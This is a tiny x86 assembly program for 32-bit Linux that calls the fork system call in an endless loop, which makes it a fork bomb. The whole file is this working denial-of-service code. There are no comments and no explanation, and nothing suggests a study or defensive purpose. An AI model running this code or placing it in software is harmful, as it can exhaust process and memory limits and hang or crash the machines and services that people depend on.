section .text

global _start  
_start:  
  
	xor eax, eax  
	add eax, 2  
	int 0x80
	jmp short _start 
